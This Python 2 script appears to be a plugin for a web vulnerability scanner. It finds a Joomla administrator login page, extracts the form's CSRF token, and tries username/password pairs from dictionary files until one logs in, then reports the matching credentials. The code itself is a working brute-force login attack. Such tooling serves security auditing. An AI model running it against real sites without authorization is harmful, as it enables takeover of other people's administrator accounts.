#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import sys
import re

def assign(service, arg):
    if service == "joomla":
        return True, arg
        
def force(url, name, passwd):
    code, head, res, errcode, _ = curl.curl('%s' % (url))
    token = re.search('\"([a-z0-9]*)\" value=\"1',res).group(1)
    data = 'username='+ name + '&passwd=' + passwd + '&option=com_login&task=login&return=aW5kZXgucGhw&' + token + '=1'
    code, head, res, errcode, _ = curl.curl('-d %s %s' % (data, url))
    code, head, res, errcode, _ = curl.curl('%s' % (url))
    if (res.find('task=logout') != -1):
        return True
    else:
        return False

def audit(arg):
    url = arg + 'administrator/index.php'
    host = urlparse.urlparse(arg).hostname
    code, head, res, errcode, _ = curl.curl('%s' % url)
    if (code == 200):
        security_info('joomla website back end: %s' % url)
        if(len(re.findall('input name',res)) == 2 and len(re.findall('hidden',res)) == 5):
            pass_list = util.load_password_dict(
                host,
                userfile='database/form_user.txt', 
                passfile='database/form_pass.txt',
                )
            for username,password in pass_list:
                if(force(url, username, password)):
                    security_hole('password : maybe ' + username + '/' + password)
                    break
	
if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.example.com/')[1])
